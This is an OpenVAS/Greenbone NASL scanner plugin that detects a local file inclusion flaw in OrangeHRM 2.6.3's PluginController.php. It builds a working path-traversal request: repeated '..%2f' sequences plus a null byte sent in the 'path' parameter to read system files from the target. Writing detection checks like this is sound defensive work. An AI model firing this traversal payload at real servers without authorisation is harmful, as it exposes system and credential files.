CPE = "cpe:/a:orangehrm:orangehrm";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902367" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-05-11 15:50:14 +0200 (Wed, 11 May 2011)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "OrangeHRM 'PluginController.php' Local File Inclusion Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_orangehrm_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "orangehrm/detected" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/17212/" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/100823/OrangeHRM2.6.3-lfi.txt" );
	script_tag( name: "impact", value: "Successful exploitation could allow attackers to perform file
  inclusion attacks and read arbitrary files on the affected application." );
	script_tag( name: "affected", value: "OrangeHRM version 2.6.3 and prior" );
	script_tag( name: "insight", value: "The flaw is due to input validation error in
  'plugins/PluginController.php' which fails to validate 'path parameter',
  which allows attackers to read arbitrary files via a ../(dot dot) sequences." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running with OrangeHRM and is prone to local file
  inclusion vulnerability." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for file in keys( files ) {
	url = dir + "/plugins/PluginController.php?path=" + crap( data: "..%2f", length: 3 * 15 ) + files[file] + "%00";
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

